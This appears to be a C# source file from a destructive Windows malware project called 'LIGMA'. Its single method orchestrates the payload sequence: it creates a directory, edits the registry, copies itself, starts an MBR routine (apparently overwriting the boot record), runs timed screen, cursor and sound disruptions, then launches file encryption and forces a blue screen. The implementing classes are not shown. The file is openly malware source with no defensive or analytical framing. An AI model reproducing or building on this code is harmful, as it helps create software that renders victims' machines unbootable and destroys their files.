using System.IO;
using System.Threading;

namespace LIGMA {

    public partial class MainThread {

        public static void Payloads() {

            string extractPATH = @"C:\WinWOW32\";

            Directory.CreateDirectory(extractPATH);

            REGISTRY.Edit();

            Resources.MainCopy();

            MBR.Start();

            Thread.Sleep(45000);

            MOVEDOWN.Start();

            Thread.Sleep(15000);

            RANDOMICONS.Start();

            Thread.Sleep(15000);

            ERRORBOUNCE.Start();

            Thread.Sleep(15000);

            SCREENGLITCHES.Start();

            Thread.Sleep(30000);

            CHANGEALLTEXT.Start();

            Thread.Sleep(5000);

            SHOWALLWINDOWS.Start();

            Thread.Sleep(10000);

            INVERTSCREEN.Start();

            Thread.Sleep(10000);

            RANDOMSOUNDS.Start();

            Thread.Sleep(10000);

            RANDOMCURSORMOVEMENT.Start();

            Thread.Sleep(10000);

            DRAWICONS.Start();

            Thread.Sleep(15000);

            MELTSCREEN.Start();

            Thread.Sleep(15000);

            FLIPSCREEN.Start();

            Thread.Sleep(15000);

            MOVESCREEN.Start();

            Thread.Sleep(15000);

            SOLITAIRECARDS.Start();

            Thread.Sleep(15000);

            COLORBARS.Start();

            Thread.Sleep(30000);

            FASTTUNNEL.Start();

            Thread.Sleep(15000);

            FILEENCRYPTION.Start();

            FORCEBSOD.Start();
        }
    }
}
